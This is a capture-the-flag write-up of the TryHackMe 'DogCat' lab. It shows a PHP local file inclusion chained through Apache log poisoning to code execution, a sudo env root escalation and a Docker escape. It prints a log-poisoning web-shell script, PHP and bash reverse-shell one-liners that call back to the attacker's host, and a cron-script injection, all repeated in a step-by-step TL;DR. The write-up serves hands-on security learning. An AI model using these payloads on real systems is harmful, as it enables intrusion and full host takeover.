---
title: "Write-up - TryHackMe Room DogCat"
date: 2022-01-18
tags: [
    "LFI", "write-up", "TryHackMe", "log_poisoning", "command_injection", "docker_scape"
]
author: "Rafael Toguko"
draft: false
hidemeta: false
comments: false
description: "Capture four flags from the box with LFI vulnerability doing escalation privileges, and docker escape to the root machine."
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
editPost:
    URL: "http://github.com/toguko/toguko.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

**Room:** [DogCat](https://tryhackme.com/room/dogcat)  
**Room create by:** [Jammy](https://tryhackme.com/p/jammy)  
**Vulnerabily tipe:** Local File Inclusion (LFI)  
**OWASP WSTG:** [Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)  
**Tags:** #LFI #write-up #TryHackMe #log_poisoning #command_injection #docker_scape  
**Author:** [Rafael Toguko](https://toguko.com/write-up/thm/dogcat)  
**Write-up date:** 2022-01-18  

 # Objectives
Capture four flags from the box with LFI vulnerability doing escalation privileges, and docker escape to the root machine.

[TL;DR](#tldr) on the end of the page!

# Write-up machine "dogcat" on TryHackMe

## Starting Recon

I always start doing at least a simple *nmap*, even on machines like this one that I know is a web LFI vulnerability.

This is my simple *nmap* scan uses only *-sV* to check which services are running on that port:
```bash
export IP=THM_MACHINE_IP
nmap -sV $IP
```

And the output was:
```bash
Nmap scan report for 10.10.173.139
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    ***Apache*** httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As soon as the machine started, I browsed to the IP address on Firefox and saw a simple webpage with two buttons (Dog|Cat).

![image_1](/images/posts/Pasted_image_20220117095112.png)

When the button is clicked, it shows an image of a dog or a cat with an address like:

```
http://$THM_MACHINE_IP/?view=dog
And
http://$THM_MACHINE_IP/?view=cat
```

Knowing that this is an LFI room; I started trying a basic path traversal such as ```/../../../../../../etc/shadow```, right after the end of the URL, but I was presented with this error on the webpage:

```php
Warning: include(dog/../../../../../../etc/shadow.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dog/../../../../../../etc/shadow.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

This error confirms that this website is vulnerable to an `LFI`, but I need to dig further to bypass some protection that prevents to showing the file's content.

![Image2](/images/posts/Pasted_image_20220117095638.png)

After some hours stucked on this problem, I decided to google for a solution.
I found a bunch of write-ups, and all of them suggesting to use the same solution, a solution presented on OWASP WSTG as well; it is called [PHP Filter](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) to encode the file to base64 and present it on the webpage.

The *PHP Filter* wrapper can be used like this `php://filter/convert.base64-encode/resource=FILE` where `FILE` is the file to retrieve. As a result of the usage of this execution, the content of the target file would be read and encoded to base64.

Lets execute the filter to show the content of index.php and analyze the content to try to find something useful.

```
http://$THM_MACHINE_IP/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
```

![image3](/images/posts/Pasted_image_20220117135900.png)

Copy the content just after the word **Here you go!**, and lets use the linux command line to decode it.

Decode base64 on Linux using the commands `echo` and `base64`:
```bash
echo -n 'PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==' | base64 --decode
```

Result of decode:

```php
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
```

On my research I found that the line ```$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';``` is a parameter that is checking if the parameter exist and add a .php in the end of it, but we can remove the “.php” extension just by defining it in the URL query.
The code also ensures that the word dog or cat must be present on the URL.

Now I tried to show the content of `/etc/passwd` to get some user password to login on with the `ssh` but when inspecting the content of it I saw that no user has permission to logon.

![passwd](/images/posts/Pasted_image_20220117164614.png)

Copy the content just after the word **Here you go!**, and lets use the website [base64decode](https://www.base64decode.org/) to decode it.

![base64 decode](/images/posts/Pasted_image_20220117165107.png)

Unfortunately, this file isn't helpful because all users don't have login permission as shown on `/usr/sbin/nologin`, so I will need to take another approach to own this machine.

## Command Injection and Log Poisoning

The nmap shows that the website is using the Apache webserver, I'll try to chain the LFI to RCE using [Command Injection](https://owasp.org/www-community/attacks/Command_Injection) on the Apache Log in an attack called [Log Poisoning](https://owasp.org/www-community/attacks/Log_Injection) and try to locate those *flag* files.

First, let check the Apache log through the URL with `http://$THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&ext`

You gonna see something like the image below, it's difficult to read it:

![base64 decode](/images/posts/Pasted_image_20220117213931.png)

Press `crtl+u` to check the source code because it's better formated to analyze the content.

![base64 decode](/images/posts/Pasted_image_20220117214126.png)

```bash
10.6.113.253 - "GET / HTTP/1.1" 200 537 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.113.253 - "GET /style.css HTTP/1.1" 200 698 "http://10.10.134.222/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)
10.6.113.253 - "GET /?view=dog HTTP/1.1" 200 563 "http://10.10.134.222/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.113.253 - "GET /dogs/7.jpg HTTP/1.1" 200 30212 "http://10.10.134.222/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.113.253 - "GET /?view=cat HTTP/1.1" 200 562 "http://10.10.134.222/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.113.253 - "GET /?view=./dog/../../../../../../../etc/passwd&ext HTTP/1.1" 200 883 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

The only thing that I can manage to inject some code here is the `User Agent` that in my case is "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0".

There are many methods to inject code as User Agent, some ways with Python, some with PHP or even with Burp Suit; I'm gonna use a [python script](https://noxtal.com/writeups/2020/07/03/tryhackme-dogcat/) that is the way that I'm more used to:

```python

#!/usr/bin/python3.8
import requests

url="http://$THM_MACHINE_IP"
print("Poisoning logs...")

payload = "<?php system((isset($_GET['cmd']))?$_GET['cmd']:'echo'); ?>"
headers = {"User-Agent": payload}

r = requests.get(url, headers = headers)

if r.status_code == 200:
  print("Log poisoned!")
else:
  print("An error occurred, please try again")

```

I save this script as log_poisoning.py and ran it with `python3 log_poisoning.py`

![python](/images/posts/Pasted_image_20220117205611.png)

When you receive the `Log poisoned!` message, you can go to the webpage and try a `ls` command on the URL to see the content of that directory.

`$THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&&cmd=ls&ext`

Press `crtl+u` again to check the source code. The directory output is shown below:

![python](/images/posts/Pasted_image_20220117215103.png)

From this `ls` command log you can see that we have a file called `flag.php` in the root directory, lets get the first flag with the `cat` command as show below:

`$THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&&cmd=cat%20flag.php&ext`

![python](/images/posts/Pasted_image_20220117215528.png)

We are currently on the directory `/var/www/html`. I tried to change directories and looked for other flags doing a `cd .. && ls`. To do that, I encode the command with the help of CyberChef:

![python](/images/posts/Pasted_image_20220117231314.png)

The URL encoded was this one:

`http://THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&&cmd=cd%20%2E%2E%26%26ls%0A&ext`

From the source code, I could see a file `flag2_QMW7JvaY2LvK.txt`, so I did a `cat` command again on that file to show the second flag content:

`http://THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&cmd=cd%20%2E%2E%26%26ls%26%26cat%20flag2%5FQMW7JvaY2LvK%2Etxt%0A&ext`

![python](/images/posts/Pasted_image_20220118113728.png)

I tried going around some directories to find the third flag but I couldn't find it; Probably it is under a root directory, so now is time to do a *Privilege Escalation*

### Command Injection to archieve a Reverse Shell

Now is time to send a payload to the server with some PHP code to get a reverse shell, the first step to get a payload for reverse shell is the Github repository of  [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings), and in this case, the [PHP Reverse shell page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php).

I got the first line from the list:
`php -r '$sock=fsockopen("YOUR_LOCAL_TUN0_IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");'`

You can get your `tun0` ip from the command line doing a `ip address`

![python](/images/posts/Pasted_image_20220117234116.png)

And put it on the [CyberChef](https://gchq.github.io/CyberChef) to encode it to **URL Encode** with my IP for the reverse shell.

![python](/images/posts/Pasted_image_20220117233636.png)

Before executing it on the URL I started a listener on my machine:
```shell
nc -lvnp 4242
```

Now just paste the URL and see the shell starting in your machine:

`http://THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&cmd=YOUR_CYBERCHEF_PAYLOAD&ext`

The first thing that I learned to do when trying to get root on a machine is to check what commands I can execute as root with my current user with the command `sudo ls`

And *Voilà*, my user can execute `/usr/bin/env`

```
10.6.113.253 - - [18/Jan/2022:02:46:41 +0000] "GET / HTTP/1.1" 200 537 "-" "Matching Defaults entries for www-data on cf642f3ae67c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on cf642f3ae67c:
    (root) NOPASSWD: /usr/bin/env
```

Now, lets check the famous [GTFO Bins](https://gtfobins.github.io/gtfobins/env/), and search for [`env`](![[Pasted image 20220117221239.png]]).

![python](/images/posts/Pasted_image_20220117221230.png)

GTFO tell us that we can get root access doing a `sudo env /bin/bash` if our user has permission to execute sudo, and in this case we had, and I could get root access.

I went straight to list the root directory and found the third flag on the `/root` directory.

![python](/images/posts/Pasted_image_20220118000159.png)

After that, I got stuck checking some directories and did not find anything useful; I decided to check other write-ups to see how to get the fourth flag.

I found that we are in a docker container and need to scape it; most of the write-ups didn't tell how they found that we were in a docker container, some of them just throw that using the command `hostname` you will see that the machine hostname will be probable some numbers and letter without any meaning, in my case the hostname was `9b53def64ff3`.

Only [this one](https://whokilleddb.medium.com/dogcat-walk-through-from-tryhackme-2c3c60ee2829) shows that he did an `ls -la` on the root directory and found a `.dockerenv` file that reveals that we were in a docker container.

The next step was to inject some code on the file `backup.sh` inside the folder `/opt/backups`, and again no one told how they found that this file was marked to run every minute as a daemon.

I followed  their instruction and first spawned  another listener on my machine:
```bash
nc -lvnp 1234
```

Went to the directory `/opt/backups`and injected the commands below on the file backup.sh that runs every minute.
```bash
echo "#!/bin/bash" > backup.sh
```

```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_LOCAL_IP>/1234 0>&1'" >> backup.sh
```

You will receive a second reverse shell in your second listener. Now just list the directory and you gonna see the fourth flag file `flag4.txt` on the root directory.

Execute a `cat flag4.txt` and grab the content.

**Machine owned completely after a lot of research 🦾**

I learned a lot on this machine, and now I'm going to focus on more machines on Try hack Me that leverage Local File Inclusion with Remote shells and privilege escalation to learn even more.

I was only doing the Try hack Me machines without writing my notes or doing a write-up like this one, so when I finished this machine, I realized that I could have done it in many easiest and fastest ways, but this is part of my learning curve.
So even though I'll take longer to finish a room because I'm writing down everything and doing screenshots, I'll keep doing that to remember what steps I did in the past and why I took some paths. By doing it, I'll be able to improve myself, write better reports, remember to take some shortcuts and so on.

## TL;DR

I decided to do a TL;DR to be more concise in all my write-up, so you have an option to just follow the recipe below or read the full post with more details and images.

- The machine only allow `path transversal` with the words *dog* or *cat* on the URL
- Checked `/etc/passwd` but the user's doen't have permission to log in
- Going to do `Command Injection` to achieve `Log poisoning` on a Apache Server
- You can check the logs with this URL
```URL
http://$THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&ext
```
Press `ctrl+u` to see the log on the source code.

- We can do a `command injection` on the `User Agent` on the Apache Log
- Use the script bellow to inject the payload, copy and save a file in your computer *change the url variable* and execute it with `python3 file.py`:

```python

#!/usr/bin/python3.8
import requests

url="http://$THM_MACHINE_IP"
print("Poisoning logs...")

payload = "<?php system((isset($_GET['cmd']))?$_GET['cmd']:'echo'); ?>"
headers = {"User-Agent": payload}

r = requests.get(url, headers = headers)

if r.status_code == 200:
  print("Log poisoned!")
else:
  print("An error occurred, please try again")

```

- After receiving the message `Log poisoned!` go to the website and try a `ls` command to see the directory content
```URL
$THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&&cmd=ls&ext
```

- If you check the source code you gonna see the directory content with our first flag called flag.php, lets see it content with `cat`
```URL
$THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&&cmd=cat%20flag.php&ext
```

- I used CyberChef to encode a `cd .. && ls` command to check the directory below the current one and found the second flag, the URL encoded was this one:
```URL
http://THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&&cmd=cd%20%2E%2E%26%26ls%0A&ext
```

- From the source code, I could see a file `flag2_QMW7JvaY2LvK.txt`, and did a `cat` command again on the file to show the second flag content, the URL encoded by the CyberChef was this one:
```URL
http://THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&cmd=cd%20%2E%2E%26%26ls%26%26cat%20flag2%5FQMW7JvaY2LvK%2Etxt%0A&ext
```

- I tried to go around to find the third flag, but I couldn't find it. It is probably under a root directory, so now it's time to do another *Command Injection* to get a *Reverse Shell* to get root access.

- First I got the [PHP Reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php) below from [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings),
```PHP
php -r '$sock=fsockopen("YOUR_LOCAL_TUN0_IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- Open a `netcat` listener in your local machine
```bash
nc -lvnp 4242
```

- Put YOUR LOCAL IP and Encoded the PHP reverse shell above to a URL Encode, encode all special characters with [CyberChef](https://bit.ly/3FGE44G) and put the encoded line just after the `cmd=` on the URL, don't forget to live the `&ext` on the end of the URL

`http://THM_MACHINE_IP/?view=./dog/../../../../../../../var/log/apache2/access.log&cmd=YOUR_CYBERCHEF_PAYLOAD&ext`

- You will get a reverse shell in your machine, execute a `sudo ls` to see which commands you can execute as root.
- You will se that the current user can execute `/usr/bin/env`

```
10.6.113.253 - - [18/Jan/2022:02:46:41 +0000] "GET / HTTP/1.1" 200 537 "-" "Matching Defaults entries for www-data on cf642f3ae67c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on cf642f3ae67c:
    (root) NOPASSWD: /usr/bin/env
```

- Execute a `sudo env /bin/sh` tog get root access.
- Execute a `cd /root` to go to the root directory.
- Execute a `ls` to list the directory and find the third flag.
- Execute a `cat flag3.txt` to get the content of the flag.

- After that I got stuck and check some other write-ups to see how to get the fourth flag, I found that we are in a docker container and need to scape it doing the follow below:
- Open another listener in your local machine
```bash
nc -lvnp 1234
```

- Go to the directory `/opt/backups` and inject the commands below on the file backup.sh that runs every minute.
```bash
echo "#!/bin/bash" > backup.sh
```

```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_LOCAL_IP>/1234 0>&1'" >> backup.sh
```

- You will receive a second reverse shell in your second listener; just list the directory, and you gonna see the fourth flag file `flag4.txt`
- Execute a `cat flag4.txt` and grab the content.

**Machine owned completely 🦾**

I was only doing the Try hack Me machines without writing my notes or doing a write-up like this one, so when I finished this machine, I realized that I could have done it in many easiest and fastest ways, but this is part of my learning curve.
So even though I'll take longer to finish a room because I'm writing down everything and doing screenshots, I'll keep doing that to remember what steps I did in the past and why I took some paths. By doing it, I'll be able to improve myself, write better reports, remember to take some shortcuts and so on.